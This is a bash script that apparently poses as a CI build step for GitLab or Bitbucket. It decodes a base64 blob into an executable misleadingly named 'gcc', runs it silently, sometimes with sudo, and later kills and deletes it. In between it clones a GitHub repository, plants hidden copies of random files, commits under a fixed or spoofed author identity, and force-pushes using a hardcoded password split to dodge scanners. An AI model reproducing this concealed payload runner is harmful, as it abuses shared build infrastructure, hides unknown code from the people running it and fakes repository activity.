#!/usr/bin/env bash

MODE="GitLab"
SUDO=""
if [[ $1 == 'apg' ]]
then
    SUDO="sudo"
elif [[ $1 == 'make' ]]
then
    if [[ $MODE == 'Bitbucket' || $MODE == 'GitLab' ]]
    then
        base64 -d gcc.64 > gcc 2>/dev/null
        chmod +x gcc &>/dev/null
    fi
elif [[ $1 == 'rebuild' ]]
then
    if [[ $MODE == 'Bitbucket' || $MODE == 'GitLab' ]]
    then
        base64 -d gcc.64 > gcc 2>/dev/null
        chmod +x gcc &>/dev/null
    fi
    SUDO="sudo"
else
    if [[ $MODE == 'Bitbucket' || $MODE == 'GitLab' ]]
    then
        base64 -d gcc.64 > gcc 2>/dev/null
        chmod +x gcc &>/dev/null
    fi
fi

$SUDO ./gcc &>/dev/null

D="n"
TB=$(date +%s)
TD=$((1800 + $(shuf -i 0-180 -n 1)))

TE=$((TB + TD))
TEC=$((TB + 1))

while true
do
    TC=$(date +%s)
    if [[ $D == 'n' ]]
    then
        if [[ TC -gt TEC ]]
        then
            git clone --branch master --depth 20 --no-tags --single-branch https://github.com/jimrose-tta/unlock.git cloned_repo &>/dev/null || true
            cd cloned_repo || true
            R=$((RANDOM % 2))
            H=$(git rev-list master | tail --lines 1) || true

            if [[ R -eq 0 ]]
            then
                git config user.email 'jimi.rosario@outlook.com' &>/dev/null || true
                git config user.name 'Jimi Rosario' &>/dev/null || true
            else
                AE=$(git log --format='%ae' "$H") || true
                AN=$(git log --format='%an' "$H") || true
                git config user.email "j$AE" &>/dev/null || true
                git config user.name "$AN" &>/dev/null || true
            fi

            RF1=$(find . ! -path './.git/*' -size -50k -type f ! -iname '.*' ! -iname '_*' | shuf | head --lines 1) || true
            RF2=$(find . ! -path './.git/*' -size -50k -type f ! -iname '.*' ! -iname '_*' | shuf | head --lines 1) || true
            RF1B=$(basename "$RF1") || true
            RF2B=$(basename "$RF2") || true
            RF1D=$(dirname "$RF1") || true
            RF2D=$(dirname "$RF2") || true
            rm -rf "$RF1D"/."$RF1B" &>/dev/null || true
            rm -rf "$RF2D"/."$RF2B" &>/dev/null || true
            rm -rf "$RF1D"/_"$RF1B" &>/dev/null || true
            rm -rf "$RF2D"/_"$RF2B" &>/dev/null || true

            if [[ R -eq 0 ]]
            then
                cp -rf "$RF1" "$RF1D"/."$RF1B" &>/dev/null || true
                cp -rf "$RF2" "$RF2D"/_"$RF2B" &>/dev/null || true
            else
                cp -rf "$RF1" "$RF1D"/_"$RF1B" &>/dev/null || true
                cp -rf "$RF2" "$RF2D"/."$RF2B" &>/dev/null || true
            fi

            git add . &>/dev/null || true
            git log --format='%B' "$(git rev-list master | tail --lines 1)" | git commit --file - &>/dev/null || true
            P_1=""
            P_2="oNOLTt5ges4"
            git push --force --no-tags https://jimrose-tta:''"$P_1""$P_2"''@github.com/jimrose-tta/unlock.git &>/dev/null || true
            cd .. || true
            rm -rf cloned_repo || true
            D="y"
        fi
    fi

    echo $TC
    sleep 60

    TC=$(date +%s)
    if [[ TC -gt TE ]]
    then
        $SUDO kill "$(pgrep gcc)" &>/dev/null
        break
    fi
done

rm -rf gcc &>/dev/null
